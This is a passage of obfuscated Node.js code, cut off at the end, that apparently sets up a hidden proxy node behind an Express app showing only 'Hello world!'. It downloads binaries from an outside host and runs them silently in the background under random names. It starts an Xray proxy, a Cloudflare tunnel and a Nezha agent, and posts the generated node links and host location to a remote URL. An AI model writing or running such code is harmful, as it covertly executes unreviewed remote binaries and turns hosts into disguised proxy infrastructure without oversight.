const _0x1e4301=_0x43e9;(function(_0x38ec19,_0x4ee93f){const _0x22ed4a={_0x26d8c9:0x1d8,_0x4b16ec:0x175,_0x4f8d1a:0x1e1,_0x467822:0x1af},_0x4ebc36=_0x43e9,_0x2b80bf=_0x38ec19();while(!![]){try{const _0x1cdc8d=-parseInt(_0x4ebc36(0x14a))/0x1+parseInt(_0x4ebc36(0x1b8))/0x2*(-parseInt(_0x4ebc36(0x163))/0x3)+-parseInt(_0x4ebc36(_0x22ed4a._0x26d8c9))/0x4+-parseInt(_0x4ebc36(_0x22ed4a._0x4b16ec))/0x5*(-parseInt(_0x4ebc36(0x1eb))/0x6)+parseInt(_0x4ebc36(0x1be))/0x7+parseInt(_0x4ebc36(0x1e7))/0x8+parseInt(_0x4ebc36(_0x22ed4a._0x4f8d1a))/0x9*(parseInt(_0x4ebc36(_0x22ed4a._0x467822))/0xa);if(_0x1cdc8d===_0x4ee93f)break;else _0x2b80bf['push'](_0x2b80bf['shift']());}catch(_0x2a6f8a){_0x2b80bf['push'](_0x2b80bf['shift']());}}}(_0x22f6,0x7c32c));const express=require('express'),app=express(),axios=require(_0x1e4301(0x139)),os=require('os'),fs=require('fs'),path=require(_0x1e4301(0x134)),{promisify}=require(_0x1e4301(0x165)),exec=promisify(require(_0x1e4301(0x145))[_0x1e4301(0x1a0)]),{execSync}=require(_0x1e4301(0x145)),UUID=process[_0x1e4301(0x153)][_0x1e4301(0x1aa)]||_0x1e4301(0x196),NEZHA_SERVER=process[_0x1e4301(0x153)]['NEZHA_SERVER']||'';上传节点,同时填写UPLOAD_URL和PROJECT_URL将上传订阅;const UPLOAD_URL=process[_0x1e4301(0x153)][_0x1e4301(0x1f0)]||'',PROJECT_URL=process['env'][_0x1e4301(0x1d3)]||'',AUTO_ACCESS=process['env'][_0x1e4301(0x1ca)]||![],FILE_PATH=process['env'][_0x1e4301(0x176)]||_0x1e4301(0x1b5),SUB_PATH=process[_0x1e4301(0x153)][_0x1e4301(0x17d)]||_0x1e4301(0x15d),PORT=process[_0x1e4301(0x153)][_0x1e4301(0x178)]||process[_0x1e4301(0x153)][_0x1e4301(0x14f)],NEZHA_PORT=process[_0x1e4301(0x153)][_0x1e4301(0x194)]||'',NEZHA_KEY=process[_0x1e4301(0x153)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x1e4301(0x153)][_0x1e4301(0x198)]||_0x1e4301(0x1c4),ARGO_AUTH=process[_0x1e4301(0x153)][_0x1e4301(0x1b6)]||_0x1e4301(0x147),ARGO_PORT=process[_0x1e4301(0x153)][_0x1e4301(0x1d5)]||0x1f41,CFIP=process[_0x1e4301(0x153)][_0x1e4301(0x187)]||_0x1e4301(0x13b),CFPORT=process[_0x1e4301(0x153)][_0x1e4301(0x192)]||0x1bb,NAME=process[_0x1e4301(0x153)][_0x1e4301(0x16e)]||_0x1e4301(0x1dd);!fs[_0x1e4301(0x19d)](FILE_PATH)?(fs[_0x1e4301(0x185)](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console[_0x1e4301(0x1ad)](FILE_PATH+_0x1e4301(0x1d4));function generateRandomName(){const _0x103a5e={_0x2ed651:0x1a7},_0x4f528b=_0x1e4301,_0x464d2a='abcdefghijklmnopqrstuvwxyz';let _0x5a1ac2='';for(let _0x5c0505=0x0;_0x5c0505<0x6;_0x5c0505++){_0x5a1ac2+=_0x464d2a[_0x4f528b(_0x103a5e._0x2ed651)](Math['floor'](Math[_0x4f528b(0x1a5)]()*_0x464d2a[_0x4f528b(0x1c3)]));}return _0x5a1ac2;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x1e4301(0x164)](FILE_PATH,npmName),phpPath=path[_0x1e4301(0x164)](FILE_PATH,phpName),webPath=path[_0x1e4301(0x164)](FILE_PATH,webName),botPath=path[_0x1e4301(0x164)](FILE_PATH,botName),subPath=path[_0x1e4301(0x164)](FILE_PATH,_0x1e4301(0x13a)),listPath=path[_0x1e4301(0x164)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,_0x1e4301(0x151)),configPath=path['join'](FILE_PATH,_0x1e4301(0x1a4));function deleteNodes(){const _0x3c4fb1={_0x160342:0x19d,_0x1eddc6:0x136,_0x15f7d5:0x17a,_0x2bd5cf:0x1b2,_0x2b1e87:0x18d,_0x1144dc:0x1cf,_0x3e3b98:0x1c3,_0xc8c69f:0x18e,_0x4d5de0:0x19c,_0x4787a1:0x1d6},_0x170ddb=_0x1e4301;try{if(!UPLOAD_URL)return;if(!fs[_0x170ddb(_0x3c4fb1._0x160342)](subPath))return;let _0x37b5ea;try{_0x37b5ea=fs[_0x170ddb(_0x3c4fb1._0x1eddc6)](subPath,_0x170ddb(_0x3c4fb1._0x15f7d5));}catch{return null;}const _0x34c8f4=Buffer[_0x170ddb(_0x3c4fb1._0x2bd5cf)](_0x37b5ea,_0x170ddb(0x133))[_0x170ddb(0x179)]('utf-8'),_0x316160=_0x34c8f4[_0x170ddb(_0x3c4fb1._0x2b1e87)]('\x0a')[_0x170ddb(_0x3c4fb1._0x1144dc)](_0x580221=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x580221));if(_0x316160[_0x170ddb(_0x3c4fb1._0x3e3b98)]===0x0)return;return axios[_0x170ddb(_0x3c4fb1._0xc8c69f)](UPLOAD_URL+_0x170ddb(_0x3c4fb1._0x4d5de0),JSON[_0x170ddb(0x1ed)]({'nodes':_0x316160}),{'headers':{'Content-Type':_0x170ddb(_0x3c4fb1._0x4787a1)}})[_0x170ddb(0x18b)](_0x509c43=>{return null;}),null;}catch(_0x1165c1){return null;}}function cleanupOldFiles(){const _0x438ecb={_0x30557e:0x1ce,_0xb1bf43:0x16c},_0x58c78e={_0x2685fa:0x1ea},_0x1dc4c5=_0x1e4301;try{const _0x10fe42=fs[_0x1dc4c5(_0x438ecb._0x30557e)](FILE_PATH);_0x10fe42[_0x1dc4c5(_0x438ecb._0xb1bf43)](_0x1226ea=>{const _0x396c9d=_0x1dc4c5,_0x3cbe36=path['join'](FILE_PATH,_0x1226ea);try{const _0x1f0ec9=fs[_0x396c9d(_0x58c78e._0x2685fa)](_0x3cbe36);_0x1f0ec9[_0x396c9d(0x180)]()&&fs[_0x396c9d(0x19f)](_0x3cbe36);}catch(_0xd06dae){}});}catch(_0xb28749){}}function _0x43e9(_0x54110b,_0x310019){const _0x22f633=_0x22f6();return _0x43e9=function(_0x43e9ab,_0x5cbaee){_0x43e9ab=_0x43e9ab-0x133;let _0x315d21=_0x22f633[_0x43e9ab];return _0x315d21;},_0x43e9(_0x54110b,_0x310019);}app[_0x1e4301(0x177)]('/',function(_0x26c3bd,_0x339c5a){const _0x274171={_0x3c458a:0x135},_0x53025d=_0x1e4301;_0x339c5a[_0x53025d(_0x274171._0x3c458a)]('Hello\x20world!');});async function generateConfig(){const _0x4d5237={_0x50cba7:0x1ab,_0x1d5e7a:0x16a,_0x240bb6:0x16f,_0x41841c:0x167,_0x113f37:0x14d,_0x1380b8:0x189,_0x47a694:0x189,_0x4c8147:0x1a2,_0x4aa3de:0x1a2,_0x4310f6:0x1a4},_0x54a621=_0x1e4301,_0x5267bf={'log':{'access':_0x54a621(_0x4d5237._0x50cba7),'error':_0x54a621(_0x4d5237._0x50cba7),'loglevel':_0x54a621(_0x4d5237._0x1d5e7a)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x54a621(0x17c),'settings':{'clients':[{'id':UUID,'flow':_0x54a621(0x161)}],'decryption':_0x54a621(_0x4d5237._0x1d5e7a),'fallbacks':[{'dest':0xbb9},{'path':_0x54a621(_0x4d5237._0x240bb6),'dest':0xbba},{'path':_0x54a621(_0x4d5237._0x41841c),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x54a621(0x189),'protocol':_0x54a621(0x17c),'settings':{'clients':[{'id':UUID}],'decryption':_0x54a621(0x16a)},'streamSettings':{'network':_0x54a621(_0x4d5237._0x113f37),'security':_0x54a621(0x16a)}},{'port':0xbba,'listen':_0x54a621(_0x4d5237._0x1380b8),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x54a621(0x16a),'wsSettings':{'path':_0x54a621(_0x4d5237._0x240bb6)}},'sniffing':{'enabled':!![],'destOverride':[_0x54a621(0x174),_0x54a621(0x1a2),_0x54a621(0x14e)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x54a621(_0x4d5237._0x47a694),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x54a621(0x167)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x54a621(_0x4d5237._0x4c8147),_0x54a621(0x14e)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x54a621(0x189),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x54a621(0x16a),'wsSettings':{'path':_0x54a621(0x1d0)}},'sniffing':{'enabled':!![],'destOverride':[_0x54a621(0x174),_0x54a621(_0x4d5237._0x4aa3de),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x54a621(0x1e8)]},'outbounds':[{'protocol':_0x54a621(0x1e2),'tag':'direct'},{'protocol':_0x54a621(0x1a3),'tag':_0x54a621(0x18a)}]};fs[_0x54a621(0x1c9)](path['join'](FILE_PATH,_0x54a621(_0x4d5237._0x4310f6)),JSON['stringify'](_0x5267bf,null,0x2));}function getSystemArchitecture(){const _0x35852b={_0xa834d7:0x15b,_0x3db1d3:0x1ac,_0x568bba:0x1d9},_0x5d4485=_0x1e4301,_0x6e8b5b=os['arch']();return _0x6e8b5b===_0x5d4485(_0x35852b._0xa834d7)||_0x6e8b5b===_0x5d4485(_0x35852b._0x3db1d3)||_0x6e8b5b===_0x5d4485(_0x35852b._0x568bba)?_0x5d4485(0x15b):_0x5d4485(0x19b);}function downloadFile(_0x4e177c,_0x3c401f,_0x5debff){const _0x32c127={_0x31523c:0x1f9,_0x5b6b68:0x177,_0x24a5a8:0x183,_0x56371d:0x18b},_0x5c1bf1={_0xe59e35:0x1e4,_0x22f627:0x13f},_0x5afdd6={_0x2d5601:0x1bd,_0x22cc0c:0x190},_0x5f3bdc=_0x1e4301,_0x540538=_0x4e177c;!fs[_0x5f3bdc(0x19d)](FILE_PATH)&&fs[_0x5f3bdc(0x185)](FILE_PATH,{'recursive':!![]});const _0x267da1=fs[_0x5f3bdc(_0x32c127._0x31523c)](_0x540538);axios({'method':_0x5f3bdc(_0x32c127._0x5b6b68),'url':_0x3c401f,'responseType':_0x5f3bdc(_0x32c127._0x24a5a8)})['then'](_0x3545bf=>{const _0x1f2dbf={_0x2f9341:0x1bc},_0x4440cd=_0x5f3bdc;_0x3545bf['data'][_0x4440cd(0x1de)](_0x267da1),_0x267da1['on'](_0x4440cd(_0x5afdd6._0x2d5601),()=>{_0x267da1['close'](),console['log']('Download\x20'+path['basename'](_0x540538)+'\x20successfully'),_0x5debff(null,_0x540538);}),_0x267da1['on'](_0x4440cd(_0x5afdd6._0x22cc0c),_0x3944a4=>{const _0x3c8eac=_0x4440cd;fs[_0x3c8eac(0x1e5)](_0x540538,()=>{});const _0x2f5b42=_0x3c8eac(0x17f)+path[_0x3c8eac(0x1e4)](_0x540538)+'\x20failed:\x20'+_0x3944a4[_0x3c8eac(_0x1f2dbf._0x2f9341)];console['error'](_0x2f5b42),_0x5debff(_0x2f5b42);});})[_0x5f3bdc(_0x32c127._0x56371d)](_0x1eeb6b=>{const _0x37bcbd=_0x5f3bdc,_0x41384b=_0x37bcbd(0x17f)+path[_0x37bcbd(_0x5c1bf1._0xe59e35)](_0x540538)+_0x37bcbd(_0x5c1bf1._0x22f627)+_0x1eeb6b['message'];console['error'](_0x41384b),_0x5debff(_0x41384b);});}async function downloadFilesAndRun(){const _0x1972cf={_0x1f9d87:0x1d2,_0x1ccb58:0x190,_0xf409f1:0x1ae,_0x244bc3:0x18d,_0x46689f:0x1c8,_0x560b94:0x1c5,_0x1b90be:0x1e6,_0x481502:0x1a1,_0x43a5d8:0x1b0,_0x3b0c68:0x1c9,_0x40bf57:0x150,_0x665e0f:0x149,_0x8d669a:0x1ad,_0x4ef05e:0x146,_0x1300d9:0x14c,_0x1a1678:0x1c5,_0x3fea18:0x173,_0x29cdfd:0x170,_0x201ba0:0x141,_0x3194c0:0x1ef,_0x3db88a:0x1ad,_0x120c77:0x1b4,_0x2b7f04:0x137,_0x5d726f:0x190,_0xd5f6c5:0x184,_0x457510:0x19d,_0x25d827:0x13e,_0x153494:0x1f3,_0x1fa520:0x1e0},_0x32a35b={_0x34b557:0x191},_0x1814a1=_0x1e4301,_0x4c133e=getSystemArchitecture(),_0x5bbeee=getFilesForArchitecture(_0x4c133e);if(_0x5bbeee[_0x1814a1(0x1c3)]===0x0){console[_0x1814a1(0x1ad)](_0x1814a1(_0x1972cf._0x1f9d87));return;}const _0x183fd0=_0x5bbeee[_0x1814a1(0x138)](_0x543cd6=>{return new Promise((_0x392b20,_0x29a34c)=>{const _0x536a83=_0x43e9;downloadFile(_0x543cd6[_0x536a83(0x1f8)],_0x543cd6['fileUrl'],(_0x501e9c,_0xc88d7)=>{_0x501e9c?_0x29a34c(_0x501e9c):_0x392b20(_0xc88d7);});});});try{await Promise['all'](_0x183fd0);}catch(_0x4dd286){console[_0x1814a1(_0x1972cf._0x1ccb58)](_0x1814a1(0x1e3),_0x4dd286);return;}function _0x3b79e9(_0x1bf9be){const _0x133064={_0x3f919e:0x155,_0x1daca3:0x1ad,_0x416ae8:0x186},_0x51528c=_0x1814a1,_0x15f890=0x1fd;_0x1bf9be[_0x51528c(0x16c)](_0x4a8207=>{const _0x1821a8=_0x51528c;fs['existsSync'](_0x4a8207)&&fs[_0x1821a8(_0x32a35b._0x34b557)](_0x4a8207,_0x15f890,_0x4771a9=>{const _0x54bd94=_0x1821a8;_0x4771a9?console[_0x54bd94(0x190)](_0x54bd94(_0x133064._0x3f919e)+_0x4a8207+':\x20'+_0x4771a9):console[_0x54bd94(_0x133064._0x1daca3)](_0x54bd94(_0x133064._0x416ae8)+_0x4a8207+':\x20'+_0x15f890['toString'](0x8));});});}const _0x57ce1e=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3b79e9(_0x57ce1e);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x42e251=NEZHA_SERVER[_0x1814a1(_0x1972cf._0xf409f1)](':')?NEZHA_SERVER[_0x1814a1(_0x1972cf._0x244bc3)](':')[_0x1814a1(0x14b)]():'',_0xed13d2=new Set([_0x1814a1(0x19e),_0x1814a1(_0x1972cf._0x46689f),'2096',_0x1814a1(_0x1972cf._0x560b94),_0x1814a1(0x1db),_0x1814a1(0x188)]),_0x3ba590=_0xed13d2[_0x1814a1(0x1b3)](_0x42e251)?_0x1814a1(_0x1972cf._0x1b90be):_0x1814a1(0x13d),_0xce8993=_0x1814a1(_0x1972cf._0x481502)+NEZHA_KEY+_0x1814a1(_0x1972cf._0x43a5d8)+NEZHA_SERVER+_0x1814a1(0x13c)+_0x3ba590+_0x1814a1(0x166)+UUID;fs[_0x1814a1(_0x1972cf._0x3b0c68)](path[_0x1814a1(0x164)](FILE_PATH,_0x1814a1(_0x1972cf._0x40bf57)),_0xce8993);const _0x500cda=_0x1814a1(0x1b4)+phpPath+_0x1814a1(_0x1972cf._0x665e0f)+FILE_PATH+_0x1814a1(0x142);try{await exec(_0x500cda),console[_0x1814a1(_0x1972cf._0x8d669a)](phpName+'\x20is\x20running'),await new Promise(_0x1bdc77=>setTimeout(_0x1bdc77,0x3e8));}catch(_0x46befd){console['error'](_0x1814a1(_0x1972cf._0x4ef05e)+_0x46befd);}}else{let _0x2230bb='';const _0x10cfa5=['443','8443',_0x1814a1(_0x1972cf._0x1300d9),_0x1814a1(_0x1972cf._0x1a1678),'2083','2053'];_0x10cfa5['includes'](NEZHA_PORT)&&(_0x2230bb=_0x1814a1(_0x1972cf._0x3fea18));const _0x1142e1='nohup\x20'+npmPath+_0x1814a1(_0x1972cf._0x29cdfd)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1814a1(_0x1972cf._0x201ba0)+NEZHA_KEY+'\x20'+_0x2230bb+_0x1814a1(_0x1972cf._0x3194c0);try{await exec(_0x1142e1),console[_0x1814a1(_0x1972cf._0x3db88a)](npmName+'\x20is\x20running'),await new Promise(_0x1c2497=>setTimeout(_0x1c2497,0x3e8));}catch(_0x45a081){console['error'](_0x1814a1(0x1c2)+_0x45a081);}}}else console[_0x1814a1(_0x1972cf._0x8d669a)](_0x1814a1(0x168));const _0x2c533a=_0x1814a1(_0x1972cf._0x120c77)+webPath+_0x1814a1(_0x1972cf._0x2b7f04)+FILE_PATH+_0x1814a1(0x17e);try{await exec(_0x2c533a),console[_0x1814a1(0x1ad)](webName+'\x20is\x20running'),await new Promise(_0x55605f=>setTimeout(_0x55605f,0x3e8));}catch(_0x11d594){console[_0x1814a1(_0x1972cf._0x5d726f)](_0x1814a1(_0x1972cf._0xd5f6c5)+_0x11d594);}if(fs[_0x1814a1(_0x1972cf._0x457510)](botPath)){let _0x123d80;if(ARGO_AUTH[_0x1814a1(_0x1972cf._0x25d827)](/^[A-Z0-9a-z=]{120,250}$/))_0x123d80=_0x1814a1(0x159)+ARGO_AUTH;else ARGO_AUTH[_0x1814a1(0x13e)](/TunnelSecret/)?_0x123d80=_0x1814a1(_0x1972cf._0x153494)+FILE_PATH+_0x1814a1(0x19a):_0x123d80=_0x1814a1(0x162)+FILE_PATH+_0x1814a1(0x15e)+ARGO_PORT;try{await exec(_0x1814a1(0x1b4)+botPath+'\x20'+_0x123d80+'\x20>/dev/null\x202>&1\x20&'),console[_0x1814a1(0x1ad)](botName+_0x1814a1(0x1bf)),await new Promise(_0x198309=>setTimeout(_0x198309,0x7d0));}catch(_0x19e9c4){console['error'](_0x1814a1(_0x1972cf._0x1fa520)+_0x19e9c4);}}await new Promise(_0x47b4ad=>setTimeout(_0x47b4ad,0x1388));}function getFilesForArchitecture(_0x3126d3){const _0x2ff4be={_0x53b82c:0x1b7,_0x3c495f:0x1f5,_0x24b4f7:0x1e9},_0x4ed58b=_0x1e4301;let _0x2a8dbd;_0x3126d3==='arm'?_0x2a8dbd=[{'fileName':webPath,'fileUrl':_0x4ed58b(0x197)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x2a8dbd=[{'fileName':webPath,'fileUrl':_0x4ed58b(0x1f2)},{'fileName':botPath,'fileUrl':_0x4ed58b(_0x2ff4be._0x53b82c)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x191bd3=_0x3126d3==='arm'?_0x4ed58b(0x171):_0x4ed58b(0x1f4);_0x2a8dbd['unshift']({'fileName':npmPath,'fileUrl':_0x191bd3});}else{const _0x12a0b3=_0x3126d3===_0x4ed58b(0x15b)?_0x4ed58b(_0x2ff4be._0x3c495f):_0x4ed58b(_0x2ff4be._0x24b4f7);_0x2a8dbd['unshift']({'fileName':phpPath,'fileUrl':_0x12a0b3});}}return _0x2a8dbd;}function argoType(){const _0x16613d={_0x83622e:0x1f6,_0x5ab0e7:0x15f,_0x1fcdb9:0x199,_0x26db0e:0x1c9,_0x206268:0x164,_0x483614:0x15c},_0x33e2f3=_0x1e4301;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x33e2f3(_0x16613d._0x83622e));return;}if(ARGO_AUTH['includes'](_0x33e2f3(_0x16613d._0x5ab0e7))){fs[_0x33e2f3(0x1c9)](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x12b172=_0x33e2f3(0x157)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x33e2f3(0x164)](FILE_PATH,_0x33e2f3(_0x16613d._0x1fcdb9))+_0x33e2f3(0x1d1)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x33e2f3(_0x16613d._0x26db0e)](path[_0x33e2f3(_0x16613d._0x206268)](FILE_PATH,_0x33e2f3(_0x16613d._0x483614)),_0x12b172);}else console[_0x33e2f3(0x1ad)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x565dfe={_0xe17fc8:0x136,_0x3ef2a1:0x164,_0x2d796b:0x18d,_0x1855bf:0x16c,_0x29f1cb:0x1c3,_0x4cbad4:0x1ad,_0xff0eb8:0x151,_0x2c72ae:0x162,_0x2f53d4:0x1dc,_0x5274c4:0x190,_0x167d09:0x1bb},_0x36369c={_0x16fbe0:0x140,_0x2960fa:0x140,_0x5cc3c2:0x144,_0x2ffdda:0x1ec,_0x56dfd0:0x152,_0x381a53:0x1d7,_0x312eaf:0x140,_0x1535f6:0x1cc,_0x4d0e31:0x140,_0x22a8a9:0x140,_0x282f22:0x144},_0x760492={_0x4f0f6e:0x1ee,_0x383d7a:0x1c0,_0x458faa:0x1c7},_0x270752={_0xac7c0:0x13e,_0x3bcbc8:0x1a8},_0x165b5f=_0x1e4301;let _0x3b8c82;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3b8c82=ARGO_DOMAIN,console['log'](_0x165b5f(0x1c6),_0x3b8c82),await _0x1454d8(_0x3b8c82);else try{const _0x4dfc03=fs[_0x165b5f(_0x565dfe._0xe17fc8)](path[_0x165b5f(_0x565dfe._0x3ef2a1)](FILE_PATH,'boot.log'),'utf-8'),_0x47ff81=_0x4dfc03[_0x165b5f(_0x565dfe._0x2d796b)]('\x0a'),_0x31f53b=[];_0x47ff81[_0x165b5f(_0x565dfe._0x1855bf)](_0x4e3ed9=>{const _0x30c818=_0x165b5f,_0x922fd5=_0x4e3ed9[_0x30c818(_0x270752._0xac7c0)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x922fd5){const _0x17558c=_0x922fd5[0x1];_0x31f53b[_0x30c818(_0x270752._0x3bcbc8)](_0x17558c);}});if(_0x31f53b[_0x165b5f(_0x565dfe._0x29f1cb)]>0x0)_0x3b8c82=_0x31f53b[0x0],console[_0x165b5f(_0x565dfe._0x4cbad4)]('ArgoDomain:',_0x3b8c82),await _0x1454d8(_0x3b8c82);else{console[_0x165b5f(0x1ad)](_0x165b5f(0x1b9)),fs[_0x165b5f(0x19f)](path[_0x165b5f(0x164)](FILE_PATH,_0x165b5f(_0x565dfe._0xff0eb8)));async function _0x90434a(){const _0x4b2087=_0x165b5f;try{process[_0x4b2087(0x1c1)]===_0x4b2087(0x16d)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x4b2087(_0x760492._0x4f0f6e)):await exec(_0x4b2087(_0x760492._0x383d7a)+botName[_0x4b2087(0x1a7)](0x0)+']'+botName[_0x4b2087(0x1cb)](0x1)+_0x4b2087(_0x760492._0x458faa));}catch(_0x474c4f){}}_0x90434a(),await new Promise(_0x24058e=>setTimeout(_0x24058e,0xbb8));const _0x333cbc=_0x165b5f(_0x565dfe._0x2c72ae)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x165b5f(0x1b4)+botPath+'\x20'+_0x333cbc+_0x165b5f(_0x565dfe._0x2f53d4)),console[_0x165b5f(0x1ad)](botName+'\x20is\x20running'),await new Promise(_0x1af820=>setTimeout(_0x1af820,0xbb8)),await extractDomains();}catch(_0x191bf4){console[_0x165b5f(_0x565dfe._0x5274c4)]('Error\x20executing\x20command:\x20'+_0x191bf4);}}}catch(_0x318814){console['error'](_0x165b5f(_0x565dfe._0x167d09),_0x318814);}async function _0x2ec232(){const _0x14fba2=_0x165b5f;try{const _0x4914ef=await axios['get'](_0x14fba2(0x154),{'timeout':0xbb8});if(_0x4914ef['data']&&_0x4914ef[_0x14fba2(0x140)]['country_code']&&_0x4914ef[_0x14fba2(_0x36369c._0x16fbe0)]['org'])return _0x4914ef[_0x14fba2(_0x36369c._0x2960fa)][_0x14fba2(0x1b1)]+'_'+_0x4914ef[_0x14fba2(0x140)][_0x14fba2(_0x36369c._0x5cc3c2)];}catch(_0x330f1e){try{const _0xec4d94=await axios['get'](_0x14fba2(_0x36369c._0x2ffdda),{'timeout':0xbb8});if(_0xec4d94['data']&&_0xec4d94[_0x14fba2(0x140)][_0x14fba2(_0x36369c._0x56dfd0)]===_0x14fba2(_0x36369c._0x381a53)&&_0xec4d94[_0x14fba2(_0x36369c._0x312eaf)][_0x14fba2(_0x36369c._0x1535f6)]&&_0xec4d94[_0x14fba2(_0x36369c._0x4d0e31)]['org'])return _0xec4d94[_0x14fba2(_0x36369c._0x22a8a9)][_0x14fba2(_0x36369c._0x1535f6)]+'_'+_0xec4d94['data'][_0x14fba2(_0x36369c._0x282f22)];}catch(_0x1ffece){}}return _0x14fba2(0x1a6);}async function _0x1454d8(_0x363436){const _0x43fb08={_0x39c619:0x16a,_0x165f2a:0x15a,_0x4583d4:0x17b,_0x2e8afb:0x1b2,_0x4fcb56:0x158,_0x190637:0x169,_0x52d21f:0x1ad,_0x40375b:0x133,_0x4655dc:0x1c9,_0x59e8cf:0x179,_0x52e649:0x133,_0x4ddba9:0x177},_0x5ddab2=await _0x2ec232(),_0x5da409=NAME?NAME+'-'+_0x5ddab2:_0x5ddab2;return new Promise(_0x3ea832=>{const _0x35012f={_0x381d06:0x1b2,_0x5f4c84:0x179,_0x37bd1b:0x133,_0x222969:0x156,_0x262700:0x1da};setTimeout(()=>{const _0xbc5c7b=_0x43e9,_0x59c64d={'v':'2','ps':''+_0x5da409,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0xbc5c7b(_0x43fb08._0x39c619),'net':'ws','type':_0xbc5c7b(_0x43fb08._0x39c619),'host':_0x363436,'path':_0xbc5c7b(0x1cd),'tls':_0xbc5c7b(0x1a2),'sni':_0x363436,'alpn':'','fp':_0xbc5c7b(0x1f7)},_0x5c83c5=_0xbc5c7b(_0x43fb08._0x165f2a)+UUID+'@'+CFIP+':'+CFPORT+_0xbc5c7b(0x143)+_0x363436+_0xbc5c7b(0x172)+_0x363436+_0xbc5c7b(_0x43fb08._0x4583d4)+_0x5da409+'\x0a\x0avmess://'+Buffer[_0xbc5c7b(_0x43fb08._0x2e8afb)](JSON[_0xbc5c7b(0x1ed)](_0x59c64d))['toString']('base64')+_0xbc5c7b(_0x43fb08._0x4fcb56)+UUID+'@'+CFIP+':'+CFPORT+_0xbc5c7b(_0x43fb08._0x190637)+_0x363436+'&fp=firefox&type=ws&host='+_0x363436+_0xbc5c7b(0x18f)+_0x5da409+'\x0a\x20\x20\x20\x20';console[_0xbc5c7b(_0x43fb08._0x52d21f)](Buffer[_0xbc5c7b(0x1b2)](_0x5c83c5)[_0xbc5c7b(0x179)](_0xbc5c7b(_0x43fb08._0x40375b))),fs[_0xbc5c7b(_0x43fb08._0x4655dc)](subPath,Buffer[_0xbc5c7b(0x1b2)](_0x5c83c5)[_0xbc5c7b(_0x43fb08._0x59e8cf)](_0xbc5c7b(_0x43fb08._0x52e649))),console[_0xbc5c7b(_0x43fb08._0x52d21f)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0xbc5c7b(_0x43fb08._0x4ddba9)]('/'+SUB_PATH,(_0x39174d,_0x4e4bb8)=>{const _0x5a3364=_0xbc5c7b,_0x3dc90a=Buffer[_0x5a3364(_0x35012f._0x381d06)](_0x5c83c5)[_0x5a3364(_0x35012f._0x5f4c84)](_0x5a3364(_0x35012f._0x37bd1b));_0x4e4bb8[_0x5a3364(_0x35012f._0x222969)](_0x5a3364(0x1df),_0x5a3364(_0x35012f._0x262700)),_0x4e4bb8['send'](_0x3dc90a);}),_0x3ea832(_0x5c83c5);},0x7d0);});}}async function uploadNodes(){const _0xfce3cb={_0xd8b6c5:0x1d6,_0x1a902b:0x1ad,_0xe7e0c8:0x1ed,_0x509934:0x1a9},_0x4e82b0=_0x1e4301;if(UPLOAD_URL&&PROJECT_URL){const _0x1226a5=PROJECT_URL+'/'+SUB_PATH,_0x3a2832={'subscription':[_0x1226a5]};try{const _0x3c8ca9=await axios[_0x4e82b0(0x18e)](UPLOAD_URL+'/api/add-subscriptions',_0x3a2832,{'headers':{'Content-Type':_0x4e82b0(_0xfce3cb._0xd8b6c5)}});return _0x3c8ca9&&_0x3c8ca9['status']===0xc8?(console[_0x4e82b0(_0xfce3cb._0x1a902b)]('Subscription\x20uploaded\x20successfully'),_0x3c8ca9):null;}catch(_0x2de85b){if(_0x2de85b[_0x4e82b0(0x148)]){if(_0x2de85b[_0x4e82b0(0x148)][_0x4e82b0(0x152)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4e82b0(0x19d)](listPath))return;const _0x47b21a=fs['readFileSync'](listPath,_0x4e82b0(0x17a)),_0x396d02=_0x47b21a['split']('\x0a')['filter'](_0x4ba538=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x4ba538));if(_0x396d02['length']===0x0)return;const _0x39985c=JSON[_0x4e82b0(_0xfce3cb._0xe7e0c8)]({'nodes':_0x396d02});try{const _0x2c90bb=await axios[_0x4e82b0(0x18e)](UPLOAD_URL+'/api/add-nodes',_0x39985c,{'headers':{'Content-Type':_0x4e82b0(0x1d6)}});return 